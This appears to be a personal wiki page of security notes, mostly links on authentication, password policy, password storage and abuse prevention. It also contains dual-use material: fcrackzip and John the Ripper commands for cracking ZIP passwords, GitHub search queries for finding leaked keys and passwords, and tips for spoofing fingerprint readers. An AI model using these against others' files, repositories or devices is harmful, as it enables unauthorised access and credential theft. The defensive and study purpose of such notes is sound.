The protection resistance is matter of time, money or opportunities. Anything is vulnerable directly or indirectly.

> on ne peut chiffrer ou déchiffrer une donnée, l'inscrire ou la supprimer d'une mémoire sans apporter et déposer une trace sur l'ordinateur, sans modifier et prendre quelque chose qui s'y trouvait auparavant.
— [Zythom: Le principe de l'échange de Locard](http://zythom.blogspot.fr/2007/08/le-principe-de-lchange-de-locard.html)

> It's cheaper to get hacked than build strong IT defenses
– [Sad reality: It's cheaper to get hacked than build strong IT defenses • The Register](http://www.theregister.co.uk/2016/09/23/if_your_company_has_terrible_it_security_that_could_be_a_rational_business_decision/)

![door keypad where some keys are worn](CmF_ddwWMAEX7xv.jpg) [I sense a weak password](https://twitter.com/jcolman/status/748019163831074816)

> areoplanes include strict systems to separate the cabin from the cockpit [...] concept of "security domains"
— [Peak Internet of Shit - All But One "Watch Dogs 2" Hack Works in REAL LIFE – LearntEmail](https://learntemail.sam.today/blog/peak-internet-of-shit-all-but-one-watch-dogs-2-hack-works-in-real-life/)

> We had cryptographic potatoes for dinner. They were salted and hashed.
— Andromeda Yelton

> Don't trust anyone

- [The Bare Minimum of Security](http://nothingofvalue.org/)

## Resources

- [Template:Information security — Wikipedia](https://en.wikipedia.org/wiki/Template:Information_security)
- [Articles - CGSecurity](http://www.cgsecurity.org/wiki/Articles)
- https://observatory.mozilla.org/
- [Defence in depth — Wikipedia](https://en.wikipedia.org/wiki/Defence_in_depth)
- [Slides and code](https://github.com/eoftedal/presentations) and [Erlend Oftedal's stuff on Github](http://eoftedal.github.io/)
- http://www.kb.cert.org/CERT_WEB/services/vul-notes.nsf/bymetric?open&start=1
- https://github.com/Hack-with-Github/Awesome-Hacking
- [A practical guide to securing macOS](https://github.com/drduh/macOS-Security-and-Privacy-Guide)
- Free OS X Security Tools [Objective-See](https://objective-see.com/products.html)
- IP lists of suspicious activities (some lists are non-free) [I-BlockList | Home](https://www.iblocklist.com/)
- [Wiki Pages - html5security - HTML5 Security Cheatsheet - Google Project Hosting](https://code.google.com/p/html5security/w/list)

### Web security

- [A practical security guide for web developers](https://github.com/FallibleInc/security-guide-for-developers/blob/master/security-checklist.md)
- [Projects/OWASP Secure Web Application Framework Manifesto/Releases/Current/Manifesto - OWASP](https://www.owasp.org/index.php/Projects/OWASP_Secure_Web_Application_Framework_Manifesto/Releases/Current/Manifesto)
- [HTML5 Security Cheatsheet](https://github.com/cure53/H5SC) and [HTML5 Security Cheatsheet](https://html5sec.org/)
- [The Open Web Application Security Project - OWASP](https://www.owasp.org/index.php/Main_Page)
- [Everything you need to know about HTTP security headers - Appcanary](https://blog.appcanary.com/2017/http-security-headers.html)

## Authentification

- [Authentication Cheat Sheet - OWASP](https://www.owasp.org/index.php/Authentication_Cheat_Sheet)
- [The Current State Of Authentication: We Have A Password Problem – Smashing Magazine](https://www.smashingmagazine.com/2016/06/the-current-state-of-authentication-we-have-a-password-problem/)
- [Security token — Wikipedia](https://en.wikipedia.org/wiki/Security_token)
- [Password — Wikipedia](https://en.wikipedia.org/wiki/Password#Alternatives_to_passwords_for_authentication)
- [GRC's | SQRL Secure Quick Reliable Login  ](https://www.grc.com/sqrl/sqrl.htm)
- [Authentication — Wikipedia](https://en.wikipedia.org/wiki/Authentication)
- [Category:Authentication methods — Wikipedia](https://en.wikipedia.org/wiki/Category:Authentication_methods)
- [teesloane/Auth-Boss: Become an Auth Boss. Learn about different authentication methodologies on the web.](https://github.com/teesloane/Auth-Boss)

What happend if a user use products where with a domain used to redirect him, could be owned after some time by a third party: [Bugtraq: Logic security flaw in TP-LINK - tplinklogin.net](http://seclists.org/bugtraq/2016/Jul/3)

### JSON Web Tokens

Aka JWT

**Shouldn't be used for session** (can't be invalidated before the expiration date) and shouldn't contains sensitive data, just userid, roles, etc. unless you use JSON Web Encryption (JWE)

> [...] defines a compact and self-contained way for securely transmitting information between parties as a JSON object
> [...]
> Compact and self-contained: all data needed for authentication exists in the token. It can be transmitted quickly because of its small size.
> 
> Digitally signed: tokens are verified against a secret key on the server. They are secure because the content of the JWT can’t be tampered with unless the secret key is known.
> 
> Simple: JWTs are conceptually straight-forward and have low overhead. Since they provide a stateless means for authentication, they can be used across multiple servers and domains without running into CORS issues.

- [JSON Web Tokens - jwt.io](http://jwt.io/)
- [RFC 7519 - JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519)
- [draft-ietf-jose-json-web-signature-41 - JSON Web Signature (JWS)](https://tools.ietf.org/html/draft-ietf-jose-json-web-signature-41)
- [Cookies vs Tokens: The Definitive Guide](https://auth0.com/blog/cookies-vs-tokens-definitive-guide/)
- [JWT, JWS and JWE for Not So Dummies! (Part I) – FACILELOGIN](https://medium.facilelogin.com/jwt-jws-and-jwe-for-not-so-dummies-b63310d201a3)
- [javascript - Invalidating JSON Web Token - Stack Overflow](https://stackoverflow.com/questions/21978658/invalidating-json-web-tokens/23089839#23089839)
- [Stop using JWT for sessions - joepie91's Ramblings](http://cryto.net/~joepie91/blog/2016/06/13/stop-using-jwt-for-sessions/)
- [Stop using JWT for sessions, part 2: Why your solution doesn't work - joepie91's Ramblings](http://cryto.net/%7Ejoepie91/blog/2016/06/19/stop-using-jwt-for-sessions-part-2-why-your-solution-doesnt-work/)

### Login with email

> If you are storing email addresses then you probably should store them in their original case (the recipient at least) to be safe. However, always compare them case-insensitively in order to avoid duplicates.
– [I it ok to use uppercase letter in email address? - Webmaster Stack Exchange](https://webmasters.stackexchange.com/questions/34056/is-it-ok-to-use-uppercase-letters-in-email-address/34058#34058)

> The local mailbox part (the username), however, is case sensitive. The email address ReCipiENt@eXaMPle.cOm is indeed different from recipient@example.com (but it the same as ReCipiENt@example.com).
> 
> Simply put: Only the username itself is case sensitive. Email addresses are not affected by the case.
— [Are email addresse case sensitive? - Quora](https://www.quora.com/Are-email-addresses-case-sensitive)

> The local-part of a mailbox MUST BE treated as case sensitive. Therefore, SMTP implementations MUST take care to preserve the case of mailbox local-parts. Mailbox domains are not case sensitive. In particular, for some hosts the user "smith" is different from the user "Smith". However, exploiting the case sensitivity of mailbox local-parts impedes interoperability and is discouraged.
— https://www.rfc-editor.org/rfc/rfc2821.txt

### “Invalid Username or Password”, a useless security measure

You can confirm if an username exist by trying to create an new account with the same username.

https://kev.inburke.com/kevin/invalid-username-or-password-useless/

> - Rate limiting can go a fair way to preventing brute force attacks. To find email addresses, an attacker is going to need to try a lot of email addresses and/or a lot of passwords, and get a lot of them wrong. Consider throttling invalid login attempts by IP address or subnet. Check submitted passwords against a dictionary of common passwords (123456, monkey, etc) and ban that traffic extra hard. Exponential backoff (forcing attackers to try again after 1, 2, 4, 8, 16.. seconds) is useful.
> - Give guidance to users about creating strong passwords. Allow easy integration with LastPass or 1Password.
> - Add a 2-factor auth option to your website. Encourage users to use it.
> - Warn users about malicious behavior ("someone is trying to snoop your password") and contact them about suspicious logins.

### Graphical password

- [Cyberspace of Shujun LI - Graphical Passwords](http://www.hooklee.com/default.asp?t=Graphical%20Passwords)
- [Mot de passe visuel : pas la panacée - ZDNet](http://www.zdnet.fr/actualites/mot-de-passe-visuel-pas-la-panacee-39794074.htm)

### Password

- [Password storage](#password-storage)
- [Password Guidance: Simplifying Your Approach | CESG Site](https://www.cesg.gov.uk/guidance/password-guidance-simplifying-your-approach)
- [Offensive Passwords – Tim MalcomVetter – Medium](https://medium.com/@malcomvetter/offensive-passwords-451371ccd02e)
- [Password — Wikipedia](https://en.wikipedia.org/wiki/Password)
- [CmosPwd - CGSecurity](http://www.cgsecurity.org/wiki/CmosPwd) decrypts password stored in cmos (for BIOS SETUP)
- [Creating Secure Password Resets With JSON Web Tokens – Smashing Magazine](https://www.smashingmagazine.com/2017/11/safe-password-resets-with-json-web-tokens/) - Password reset workflow

- [AgileBits Blog | Security](https://blog.agilebits.com/category/security/)

Be carefull with renew password links send by email. See [Password-less login problems](#password-less-login).

Use password manager

- [Switching from 1Password to Bitwarden | joshua stein](https://jcs.org/2017/11/17/bitwarden)

#### Password reuse

![Du bruker ikke samme børste overalt, hvorfor bruke samme passord?](brush-password-reuse.png)

> You don’t use the same brush everywhere, so why do you reuse the same password?
> — [Robert Malmgren on Twitter: "Awesome, and very graphical, Norwegian info card about password security - ”You don’t use the same brush everywhere, so why do you reuse the same password?”. An excellent question!… https://t.co/WDSJHlJ7Jw"](https://twitter.com/mitt_nya_nym/status/1009350180766928896)

- [Musematte - børster - NorSIS nettbutikk](https://norsis.no/nettbutikk/produkt/musematte/)
- [Plakat 1 - børster - NorSIS nettbutikk](https://norsis.no/nettbutikk/produkt/plakat-1/)

#### Password rules

User (advices):

- use long password
- use mix of special chars, numbers, higher case and lowercase

Implementation:

- show advices and use detection rules to show warnings
- long password (at least 8 chars, never max at least 30 chars)
- don't allow password be equal to the username or the email address
- check against a blacklist:
	- top used password (like "12345678", etc.) [password top 10](https://www.google.com/search?q=password+top+10)
	- common keys/chars combinations (`:)`, `¯\_(ツ)_/¯`, words and words combinations/phrases, keyboard patterns eg. "123456"/"qwertyuiop")
- be carefull with precomposed characters:
	* [Should I use special characters in my Master Password? - 1Password Support](https://support.1password.com/special-characters-in-master-password/)
	* [Composite and Precomposed Characters](Unicode#Composite and Precomposed Characters)
- don't disallow copy/past. It wont increase protection:
	- [Troy Hunt: The “Cobra Effect” that is disabling paste on password fields](https://www.troyhunt.com/the-cobra-effect-that-is-disabling/)
	- [Let them paste passwords - NCSC Site](https://www.ncsc.gov.uk/blog-post/let-them-paste-passwords)
	- [Le copier coller est possible dans les champs de formulaire. - Bonne pratique N° 104 - Check-list Opquast Website V3 - Opquast Check-lists](https://checklists.opquast.com/fr/opquast-website-v3/criteria/43617)
- don't apply periodic changes

- [DRAFT NIST Special Publication 800-63B](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [Password Rules Are Bullshit](https://blog.codinghorror.com/password-rules-are-bullshit/)
- [Password Shamer | Shaming bad password rules everywhere.](http://www.passwordshamer.com/)
- https://github.com/duffn/dumb-password-rules
- [Stop forcing your arbitrary password rules on me. @ ryanwinchester](https://ryanwinchester.ca/posts/stop-forcing-your-arbitrary-password-rules-on-me)
- [NIST’s new password rules – what you need to know – Naked Security](https://nakedsecurity.sophos.com/2016/08/18/nists-new-password-rules-what-you-need-to-know/)
- ![xkcd password strength](https://imgs.xkcd.com/comics/password_strength.png)

- [password-policy-wall-of-shame/README.md at gh-page · publicarray/password-policy-wall-of-shame](https://github.com/publicarray/password-policy-wall-of-shame/blob/gh-pages/README.md)
- [Your Password is Too Strong](http://passwordistoostrong.tumblr.com/)
- [Bad Password Policies](http://badpasswordpolicies.tumblr.com/)
- [Password Requirement Shaming](http://password-shaming.tumblr.com/)
- [duffn/dumb-password-rules: Shaming site with dumb password rules.](https://github.com/duffn/dumb-password-rules)
- [opws/opws-dataset: Profile for the user account system of variou sites.](https://github.com/opws/opws-dataset)
- [mimuc/password-policy-dataset: Structured machine-readable password policie of the most visited web site in Germany](https://github.com/mimuc/password-policy-dataset)
- [Password Policy Hall of SHAME - Defuse Security](https://defuse.ca/password-policy-hall-of-shame.htm)
- [oxguy3/requirewhat: Tell you what a website' password requirement are so you don't have to guess](https://github.com/oxguy3/requirewhat)
- `/System/Library/PrivateFrameworks/SafariShared.framework/Versions/A/Resources/WBSAutoFillQuirks.plist` or `/Applications/Safari.app/Contents/Frameworks/SafariShared.framework/Versions/A/Resources/WBSAutoFillQuirks.plist`or `System/Library/PrivateFrameworks/SafariShared.framework/Versions/A/Resources/WBSPasswordGenerationRequirementsByDomain.plist`
	- [Guilherme Rambo on Twitter: "When you use Safari to generate passwords, thank the person at Apple that had to go through popular website and register their password requirements… https://t.co/QA4XUqCNKD"](https://twitter.com/_inside/status/959549503920660480)
	- [Safari Password Generation | Hacker News](https://news.ycombinator.com/item?id=16300214)

Password strength:

- https://cups.cs.cmu.edu/meter/ - [cupslab/password_meter: This project implements a data-driven password meter. Its effects on password security and usability were evaluated in the following publication: http://www.blaseur.com/papers/CHI17meter.pdf and a demo is available at: https://cups.cs.cmu.edu/meter/](https://github.com/cupslab/password_meter)
- https://github.com/dropbox/zxcvbn and https://github.com/bjeavons/zxcvbn-php
- [javascript - Password Strength Meter - Stack Overflow](https://stackoverflow.com/questions/948172/password-strength-meter)
- [Password Strength Checker](http://www.passwordmeter.com/)
- https://github.com/aarondo/Strength.js
- [password meter - JSFiddle](http://jsfiddle.net/dimitar/n8Dza/)
- [Bootstrap Password Strength Meter Example - JSFiddle](http://jsfiddle.net/jquery4u/mmXV5/)
- [jQuery - Password Strength - JSFiddle](http://jsfiddle.net/aleem/KE3RB/8/)
- [Edit fiddle - JSFiddle](http://jsfiddle.net/fh9FP/12/)
- https://github.com/danpalmer/jquery.complexify.js
- [Reusable Security: New Paper on Password Security Metrics](http://reusablesec.blogspot.fr/2010/10/new-paper-on-password-security-metrics.html) - "Shannon entropy" (longer is stronger) is false
- [Password strength — Wikipedia](https://en.wikipedia.org/wiki/Password_strength#Entropy_as_a_measure_of_password_strength)

See lists of [commonly used passwords](#password-leaks)

#### Password leaks

Database, clear text saved in shared files, etc.

- [notes/Do-not-underestimate-credentials-leaks.md at master · ChALkeR/notes](https://github.com/ChALkeR/notes/blob/master/Do-not-underestimate-credentials-leaks.md)
- [notes/Gathering-weak-npm-credentials.md at master · ChALkeR/notes](https://github.com/ChALkeR/notes/blob/master/Gathering-weak-npm-credentials.md)
- [Unmasked: An Analysis of 10 Million Passwords](http://wpengine.com/unmasked/)
- [Passwords - SkullSecurity](https://wiki.skullsecurity.org/Passwords)
- [62K Common Passwords | InfoSec Daily](http://wayback.archive.org/web/20130605082350/http://www.isdpodcast.com/resources/62k-common-passwords/)
- [CrackStation's Password Cracking Dictionary (Pay what you want!)](https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm)
- https://github.com/danielmiessler/SecLists/tree/master/Passwords
- [Password DNA](https://www.unix-ninja.com/p/Password_DNA)
- [Online tracking: A 1-million-site measurement and analysis](https://webtransparency.cs.princeton.edu/webcensus/index.html)

#### SSO

Aka Single sign-on.

If credentials leak, this could give access to more than one application/website.

Examples: OAuth, Google, Facebook, Twitter, LinkedIn, Github, etc.

#### Password hash cracking

- [Your Password is Too Damn Short](http://blog.codinghorror.com/your-password-is-too-damn-short/)
- [Rainbow table — Wikipédia](https://fr.wikipedia.org/wiki/Rainbow_table)

#### Fcrack zip

	sudo port install fcrackzip


	-l (#-#): specify the minimum and maximum length of passwords to check
	-b : use brute force to crack the password
	-c (charset): specify the character set to use
	-u : unzip / filter incorrect passwords

#### John the ripper

	sudo port install john-jumbo

	zip2john /path/to/file.zip > zip_hash.txt
	john –wordlist=/path/to/wordlist.txt zip_hash.txt

- [RaiderSec: Cracking Unix Password Hashes with John the Ripper (JTR)](http://raidersec.blogspot.fr/2013/01/cracking-unix-passwords-with-john.html)

### Password-less login

> provide only your email address and a link is sent to that email address. You click the link, which contains a special login code, and the website logs you in and deactivates the code so it can no longer be used. Subsequent visits to that URL just give a 403. In other words, every login is treated like a password reset. For many use cases, this could be a real pain, but for the case of, say, a site where a handful of internal users need access to an admin panel, it’s really nice to not have to deal with one more password.
— http://jon.smajda.com/2014/10/20/mailbox-and-facebook-app-links/

**[But use POST not GET!](http://blog.teamtreehouse.com/the-definitive-guide-to-get-vs-post)** 15min lifetime, 1 usage, only sent by a user request (from the app/website)

- [Suppression des mots de passe : des paroles de Google aux actes de Medium - Next INpact](http://www.nextinpact.com/news/95657-supprimer-mots-passe-google-en-parle-medium-propose-alternative.htm)
- [Le mot de passe, espèce en voie de disparition](http://www.lemonde.fr/pixels/article/2015/03/19/le-mot-de-passe-espece-en-voie-de-disparition_4596536_4408996.html)

Problems:

- This unique URL can leak
	- [Why you shouldn’t share links on Facebook — Medium](https://medium.com/@intideceukelaire/why-you-shouldnt-share-links-on-facebook-f317ba4aa58b)
	- [Password-less login – Find Work – Medium](https://medium.com/findworkco/password-less-login-df0354c3f3ee)
- links could be visited by robots (search engine, anti-virus scanner) or browser (prebrowser: prerender, preload, etc.)
	> BingPreview in Outlook webmail scans links when users open their email - invalidating one-time use links.
	— https://twitter.com/simonw/status/841090452543561729

### TOTP

Should not used to authentificate users, but only validate the auth request (2 factor auth) because secret key can be stolen on the client or the server side.

Can be use to open a port for SSH login: https://github.com/benjojo/totp-ssh-fluxer

- [Time-based One-time Password Algorithm — Wikipedia](https://en.wikipedia.org/wiki/Time-based_One-time_Password_Algorithm)
- [Activation de la double authentification - Bienvenue sur le wiki Gandi - Gandi Docs](https://wiki.gandi.net/fr/contacts/login/2-factor-activation#des_applications_totp)
- [Google TOTP Two-factor Authentication for PHP | Application Security](https://www.idontplaydarts.com/2011/07/google-totp-two-factor-authentication-for-php/) - implementation of Google TOTP

### Client certificate

Authenticate clients with certificates

- [SSL/TLS Strong Encryption: How-To - Apache HTTP Server Version 2.2](https://httpd.apache.org/docs/2.2/ssl/ssl_howto.html#accesscontrol)
- [Technology/KnowledgeBase/ClientCerts - CAcert Wiki](http://wiki.cacert.org/Technology/KnowledgeBase/ClientCerts)
- [FAQ/ImportRootCert - CAcert Wiki](http://wiki.cacert.org/FAQ/ImportRootCert)
- [FAQ/BrowserClients - CAcert Wiki](http://wiki.cacert.org/FAQ/BrowserClients#Importing_the_CAcert_Root_Certificate)
- [Installing the Certificate through the Web Browser](http://help-icc.untangle.com/Content/User%20Guide/UI_Tabs/SSLCertificateGPO_v4/Appendix%20B%20Installing%20the.htm) and [Using client side ssl certificates in firefox and chrome](http://www.binarytides.com/client-side-ssl-certificates-firefox-chrome/)
- [ssl - How to install trusted CA certificate on Android device? - Stack Overflow](https://stackoverflow.com/questions/4461360/how-to-install-trusted-ca-certificate-on-android-device/)

### Biometrics

Face, fingerprint, iris/retina and DNA

**Never use biometrics as authentification, because we can't change it if it's compromised (biometric thieft).**

> Biometrics are a username, not a password.
— https://twitter.com/netik/status/924333873252646914

> It is plain stupid to use something that you can't change and that you leave everywhere every day as a security token
— Frank Rieger from Chaos Computer Club: [CCC | Chaos Computer Club breaks Apple TouchID](http://www.ccc.de/en/updates/2013/ccc-breaks-apple-touchid)

Issues:

- the device not recognizing the fingerprint for example when the finger has been injured
- the checksum can be leaked (user’s identity steal) (especially for centralized database). SHOULD use [Zero-Knowledge Proof](https://en.wikipedia.org/wiki/Zero-knowledge_proof)
- can be fool by using the fingerprint:
	* use a scotch tape to copy the previous used fingerprint then past it on the reader with your finger
	* print in 3d or using conductive ink a fingerprint
	* any other solution mimic finger with fingerprint
- face recognition: use a picture (ex: a selfie) or a video

See also [Face](Person#face)

- [Pourquoi j’ai (encore) piraté TouchID et je trouve toujours cela génial | Le Blog Lookout](https://blog.lookout.com/fr/2014/09/23/pourquoi-jai-encore-pirate-touchid-et-je-trouve-toujours-cela-genial/)
- [Fingerprints from 5.6 million people were stolen in huge U.S. data breach](http://mashable.com/2015/09/23/opm-hack-fingerprints/)
- [Finger Print Scanners Really Aren’t That Secure | Hackaday](http://hackaday.com/2016/03/11/finger-print-scanners-really-arent-that-secure/)
- [Biometrics — Wikipedia](https://en.wikipedia.org/wiki/Biometrics)
- [CCC | Fingerprint Biometrics hacked again](https://www.ccc.de/en/updates/2014/ursel)
- [Researchers warn of fingerprint theft from 'peace' sign | The Japan Times](http://www.japantimes.co.jp/news/2017/01/11/national/crime-legal/researchers-warn-fingerprint-theft-peace-sign/)

### Two-factor authentication

Aka 2FA

> My Twitter account, two email addresses, & my phone. It was not due to passwords, they hacked my phone account itself.
> Someone called @verizon impersonating me and successfully changed my SIM & unsuccessfully attempted to change my phone number.
> By calling @verizon and successfully changing my phone's SIM, the hacker bypassed two-factor verification which I have on all accounts.
> The hacker got access by changing my SIM which redirected texts, then resetting my passwords to trigger two-factor authentication.
— https://twitter.com/deray/status/741356147479842816

- [Two-factor authentication — Wikipedia](https://en.wikipedia.org/wiki/Two-factor_authentication)
- [Two Factor Auth List](https://twofactorauth.org/)

### Software keys

Each version has private key to decode unique certificat from software version + user name encoded with public key (specific for a version of the software)

### Usurpation & social engineering

- [TIL that someone can change your Facebook email, password, and two step verification just by asking Facebook to turn off login approvals, and sending in a fake ID. (Happened to me lost all my business pages) : technology](https://www.reddit.com/r/technology/comments/4q8ywp/til_that_someone_can_change_your_facebook_email/)
- [Amazon’s customer service backdoor — Medium](https://medium.com/@espringe/amazon-s-customer-service-backdoor-be375b3428c4#.vfpvsk8yl)
- [Social engineering (security) — Wikipedia](https://en.wikipedia.org/wiki/Social_engineering_(security))
- [Thermal Attacks on Mobile-based User Authentication](http://www.mkhamis.com/data/papers/abdelrahman2017chi.pdf) - See also [Thermal Cameras Can See How You Enter Your Smartphone PIN - The Atlantic](https://www.theatlantic.com/amp/article/519069/)

## Data access and integrity

> A chain is only as strong as its weakest link

- [A collection of awesome penetration testing resources](https://github.com/enaqx/awesome-pentest)

Against attacks, read/write access or modifications

- [Public-key cryptography — Wikipedia](https://en.wikipedia.org/wiki/Public-key_cryptography)
- [RSA (cryptosystem) — Wikipedia](https://en.wikipedia.org/wiki/RSA_(cryptosystem))
- [Portail:Cryptologie — Wikipédia](https://fr.wikipedia.org/wiki/Portail:Cryptologie)
- [Portail:Sécurité informatique — Wikipédia](https://fr.wikipedia.org/wiki/Portail:S%C3%A9curit%C3%A9_informatique)
- [59Hardware - Dossier : La cryptographie](http://wayback.archive.org/web/20090227061422/http://59hardware.net/Tests/Jeux_Videos_et_Logiciels/Dossier_:_La_cryptographie.html)

### Password storage

Aka authentification data storage

See [Password](#password)

Use [bcrypt](http://en.wikipedia.org/wiki/Bcrypt) or a better one: https://github.com/p-h-c/phc-winner-argon2

**The issue with bcrypt is the limited supported password to [max 72 chars](https://stackoverflow.com/questions/3002828/bcrypt-says-long-similar-passwords-are-equivalent-problem-with-me-the-gem-o/4772058#4772058).**
To circumvent that you need to create a hash (ex: SHA512, 64 bytes) of that password before. But don't treat the hash as hexa string, but as bytes. See "You're not really going to help people much who use long passwords by hashing first. Some groups you can definitely help. Some you can definitely hurt." [php - How to hash long passwords (\>72 characters) with blowfish - Stack Overflow](https://stackoverflow.com/questions/16594613/how-to-hash-long-passwords-72-characters-with-blowfish/16597402#16597402)
See also [cryptography - Pre-hash password before applying bcrypt to avoid restricting password length - Information Security Stack Exchange](https://security.stackexchange.com/questions/6623/pre-hash-password-before-applying-bcrypt-to-avoid-restricting-password-length) and [sha 256 - Is there a way to use bcrypt with passwords longer than 72 bytes securely? - Cryptography Stack Exchange](https://crypto.stackexchange.com/questions/24993/is-there-a-way-to-use-bcrypt-with-passwords-longer-than-72-bytes-securely)

- [Plain Text Offenders](http://plaintextoffenders.com/) [plaintextoffenders/offenders.csv at master · plaintextoffenders/plaintextoffenders](https://github.com/plaintextoffenders/plaintextoffenders/blob/master/offenders.csv)
- [L'art de stocker des mots de passe - LinuxFr.org](https://linuxfr.org/users/elyotna/journaux/l-art-de-stocker-des-mots-de-passe)
- [Choosing the Right Cryptography Library for your PHP Project: A Guide - Paragon Initiative Enterprises Blog](https://paragonie.com/blog/2015/11/choosing-right-cryptography-library-for-your-php-project-guide)
- [Storing Passwords in a Highly Parallelized World · Homepage of Hynek Schlawack](https://hynek.me/articles/storing-passwords/)
- https://github.com/PolyPasswordHasher/PolyPasswordHasher
- [start [CBCrypt]](https://cbcrypt.org/doku.php)
- [Agile Blog | On hashcat and strong Master Passwords as your best protection](https://blog.agilebits.com/2013/04/16/1password-hashcat-strong-master-passwords/)
- [Secure Salted Password Hashing - How to do it Properly](https://crackstation.net/hashing-security.htm)
- [Portable PHP password hashing ("password encryption") framework](http://www.openwall.com/phpass/)
- [How To Safely Store A Password | codahale.com](http://codahale.com/how-to-safely-store-a-password/)
- [Serious Security: How to store your users’ passwords safely | Naked Security](https://nakedsecurity.sophos.com/2013/11/20/serious-security-how-to-store-your-users-passwords-safely/)
- [What technical reasons are there to have low maximum password lengths? - Information Security Stack Exchange](http://security.stackexchange.com/questions/33470/what-technical-reasons-are-there-to-have-low-maximum-password-lengths/33471#33471)
- [Serious Security: How to store your users’ passwords safely – Naked Security](https://nakedsecurity.sophos.com/2013/11/20/serious-security-how-to-store-your-users-passwords-safely/)
- [How Dropbox securely stores your passwords | Dropbox Tech Blog](https://blogs.dropbox.com/tech/2016/09/how-dropbox-securely-stores-your-passwords/)
- search public leaked authentification informations
	VCS revision contains password 
	
	- [Google Hacking Database, GHDB, Google Dorks](https://www.exploit-db.com/google-hacking-database/)
	- https://github.com/search?p=2&q=mysqli_connect+http&type=Code
	- https://github.com/search?q=%22rds.amazonaws.com%22&type=Code
	- https://github.com/search?utf8=&q=id_rsa&type=Commits&ref=searchresults
	- https://github.com/search?p=2&q=smtp.gmail.com+pass&ref=searchresults&type=Code&utf8=%E2%9C%93
	- https://github.com/search?p=2&q=DriverManager.getConnection%28&ref=searchresults&type=Code&utf8=%E2%9C%93
	- https://github.com/search?q=DBI.connect&ref=searchresults&type=Code&utf8=%E2%9C%93
	- https://github.com/search?utf8=%E2%9C%93&q=add+secret&type=Commits&ref=searchresults https://github.com/search?utf8=%E2%9C%93&q=add+secrets&type=Commits&ref=searchresults
	- https://github.com/search?utf8=%E2%9C%93&q=add+password&type=Commits&ref=searchresults https://github.com/search?utf8=%E2%9C%93&q=add+passwords&type=Commits&ref=searchresults
	- https://github.com/search?p=2&q=remove+password+oops&ref=searchresults&type=Commits&utf8=%E2%9C%93
	- https://github.com/search?utf8=%E2%9C%93&q=remove+password&type=Commits&ref=searchresults
	- https://github.com/search?utf8=&q=changed+password&type=Commits&ref=searchresults
	- [GitLeaks - Search Engine for exposed secrets on the web](https://gitleaks.com/)

#### Crendentials used in job schedulers

Like cron tasks

Executed commands appears in `ps` or in system log (could be transmited by email, etc.)

Commands often support external config file (curl: `.netrc`, mysql: `.my.cnf`, wget: `.wgetrc`, etc.). Use it with a restricted read access (only 400 or 600 mode for the specific user `chmod u=wr,g=,o= config`).
Alternatively, you can set the password in env vars `MYSQL_PWD="foo" mysqldump -ubackup --all-databases > dump.sql`

Some commands support [`.netrc` file](https://www.gnu.org/software/inetutils/manual/html_node/The-_002enetrc-file.html) password file. Use as follow:

	machine ftp.cyberciti.biz
	login myusername
	password mypassword

	chmod u=wr,g=,o= .netrc
	# if used as root:
	#sudo chown root .netrc

- SSH: use `ssh-keygen` (see `ssh-copy-id`) `ssh-keygen -t rsa -f keyfile -N ""` (create keyfile without passphrase)
- [how to pass a password with a cron job safely? - Unix & Linux Stack Exchange](http://unix.stackexchange.com/questions/176747/how-to-pass-a-password-with-a-cron-job-safely)
- [script - Where to store security credentials (aka passwords) for special cron jobs? - Super User](http://superuser.com/questions/420033/where-to-store-security-credentials-aka-passwords-for-special-cron-jobs)
- [mysql - Mysqldump launched by cron and password security - Stack Overflow](https://stackoverflow.com/questions/6861355/mysqldump-launched-by-cron-and-password-security)
- [How can I automate an SFTP transfer between two servers? - Ask Leo!](https://askleo.com/how_can_i_automate_an_sftp_transfer_between_two_servers/)
- [How to mirror/sync a remote ftp folder with a local folder | Sina Salek Official Site](http://sina.salek.ws/content/how-mirrorsync-remote-ftp-folder-local-folder)
- [authentication - How can I set up password-less SSH login? - Ask Ubuntu](http://askubuntu.com/questions/46930/how-can-i-set-up-password-less-ssh-login)
- [Easiest way to copy ssh keys to another machine? - Ask Ubuntu](http://askubuntu.com/questions/4830/easiest-way-to-copy-ssh-keys-to-another-machine/4833#4833)

### Secret sharing

Multiple private keys

Symmetric algorithm (like AES) + public key encryption algorithm (like RSA)

![This Lock Can Be Opened With 1 Lock ... No Matter Which One](This%20lock%20can%20be%20opened%20with%201%20lock%20...%20no%20matter%20which%20one.jpg) (OR gate, doesn't share the same key, using multiple private keys, see the [reddit post](https://www.reddit.com/r/pics/comments/68jboj/this_lock_can_be_opened_with_1_lock_no_matter/). See also daisychain locks / Multiple Padlock)

- [Secret sharing — Wikipedia](https://en.wikipedia.org/wiki/Secret_sharing)
- [encryption - Multiple private keys - Cryptography Stack Exchange](https://crypto.stackexchange.com/questions/44846/multiple-private-keys/44849#44849)
- [Multiple private keys for single public key - Cryptography Stack Exchange](https://crypto.stackexchange.com/questions/24125/multiple-private-keys-for-single-public-key/24128#24128)

### Prevent and detect violation

Aka breach

**You can defeat majority of violation but never all.**

![Secured](Prevent%20violation/Secured.jpg)
![When You Only Enforce Input Validations Client Side](Prevent%20violation/When%20you%20only%20enforce%20input%20validations%20client-side.jpg)

Content submission: bots create account, add review, video, message / post (SPAM), aimbot faking play games (cheat), etc.

- **never give feedback** if a violation is detected
- move the trust logic to the trusted party (the server, central logic) or as validator authority (validate transaction / scores with replay-data)
- sponsor: New account need a sponsor (acquaintance) (engage his responsibility) or publicly ask for it to all members by providing additional identifications elements (profile on other website: social network, personal website, etc.)
	Use human resource to verify the identity of the seeker

	* https://www.journalduhacker.net/login
- use captcha (Turing test)
	- [I'm Not a Human : Breaking the Google reCAPTCHA](https://www.blackhat.com/docs/asia-16/materials/asia-16-Sivakorn-Im-Not-a-Human-Breaking-the-Google-reCAPTCHA-wp.pdf)
	- [chihuahua or muffin, sheepdog or mop , puppy or bagel, labradoodle or fried chickenshiba or marshmallow, parrot or guacamole, etc.](https://twitter.com/teenybiscuit/status/667777205397680129)
- use nonce or cookies
- require a phone number, verify it (by sending a verification code). Check reused for different accounts
- verify email (send an verification link)
- authentificate with [multi-factors](https://en.wikipedia.org/wiki/Multi-factor_authentication) see also [Universal 2nd Factor](https://en.wikipedia.org/wiki/Universal_2nd_Factor)
- [prevent XSS and injection](#xss-and-injection-prevention)
- check emptyness and validate values. See [Third party data](#third-party-data)
- use time as a limit (lifespan)
- denunciation / reporting
- blacklist or whitelists of IPs (or ranges), browsers, clients names, words, etc.
- use `/robots.txt`:

		User-agent: *
		Disallow: /
- use honeypots
	"It's a trap"

